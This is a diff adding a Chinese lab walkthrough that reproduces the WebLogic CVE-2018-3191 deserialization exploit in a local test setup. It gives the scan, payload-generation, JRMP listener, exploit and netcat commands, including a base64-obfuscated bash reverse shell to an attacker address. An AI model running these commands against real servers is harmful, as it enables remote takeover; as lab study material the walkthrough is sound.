@@ -304,3 +304,77 @@ python 44553.py 127.0.0.1 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.85.
 
 
 
+# CVE-2018-3191
+
+更新于2018/10/31
+
+听说最近又出了一个危害比较大的漏洞，遂复现了一下。和之前一样，需要weblogic开启T3协议
+
+```
+nmap -n -v -Pn -sV 192.168.85.144 --script=weblogic-t3-info.nse
+```
+
+![](2018SECCON-ghostkingdom\9.jpg)
+
+需要一些准备的工具，具体可看这里https://github.com/jas502n/CVE-2018-3191
+
+需要先生成一个payload
+
+```
+java -jar weblogic-spring-jndi-10.3.6.0.jar rmi://攻击机ip:端口/exp > payload
+```
+
+```
+java -jar weblogic-spring-jndi-10.3.6.0.jar rmi://172.20.0.1:8888/exp > payload
+```
+
+![](weblogic漏洞练习\16.png)
+
+  
+
+开启一个rmi服务
+
+```
+java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 端口 CommonsCollections1 "要执行的指令"
+```
+
+```
+java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 8888 Commonollections1 "bash -c {echo,L2Jpbi9iYXNoIC1pID4gL2Rldi90Y3AvMTcyLjIwLjAuMS83Nzc3IDA8JjEgMj4mMQ==}|{base64,-d}|{bash,-i}"
+```
+
+这里将shell弹到了本地的7777端口，用nc监听一下
+
+```
+nc -lnvp 7777
+```
+
+发送攻击流量
+
+```
+python weblogic.py 172.20.0.2 7001 payload
+```
+
+![](weblogic漏洞练习\17.png)
+
+同时rmi服务会接受到`172.20.0.2`的流量
+
+![](weblogic漏洞练习\18.png)
+
+成功getshell
+
+![](weblogic漏洞练习\19.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
